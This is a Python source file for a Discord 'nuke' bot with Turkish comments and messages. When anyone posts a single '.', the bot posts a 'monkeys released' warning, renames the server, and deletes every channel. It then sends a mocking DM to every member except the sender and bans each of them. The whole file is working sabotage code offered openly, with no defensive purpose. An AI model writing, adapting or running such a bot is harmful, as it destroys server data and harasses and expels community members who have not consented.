import os
import discord
from discord.ext import commands

TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Bot aktif: {bot.user.name}")

@bot.event
async def on_message(message):
    if message.author == bot.user or not message.guild:
        return

    if message.content.strip() == ".":
        guild = message.guild

        # 1. Uyarı mesajı gönder
        try:
            await message.channel.send("🚨 **Maymunlar serbest bırakıldı!** Sunucu temizlik operasyonu başlıyor... 🐒💥")
        except Exception as e:
            print(f"Mesaj hatası: {e}")

        # 2. Sunucu adını değiştir
        try:
            await guild.edit(name="Maymun Sunucusu 🐵")
        except Exception as e:
            print(f"İsim değiştirme hatası: {e}")

        # 3. Tüm kanalları sil
        for channel in list(guild.channels):
            try:
                await channel.delete()
            except Exception as e:
                print(f"Kanal silme hatası: {channel.name} - {e}")

        # 4. Herkese DM gönder ve banla
        for member in guild.members:
            if member != message.author and not member.bot:
                try:
                    dm = await member.create_dm()
                    await dm.send("🐒 Maymunlar size skrim yapıyor! 🔥")
                    print(f"📩 DM atıldı: {member.name}")
                except Exception as e:
                    print(f"DM hatası: {member.name} - {e}")
                try:
                    await member.ban(reason="Maymun istilası nedeniyle uzaklaştırıldı")
                    print(f"🚫 Banlandı: {member.name}")
                except Exception as e:
                    print(f"Ban hatası: {member.name} - {e}")

    await bot.process_commands(message)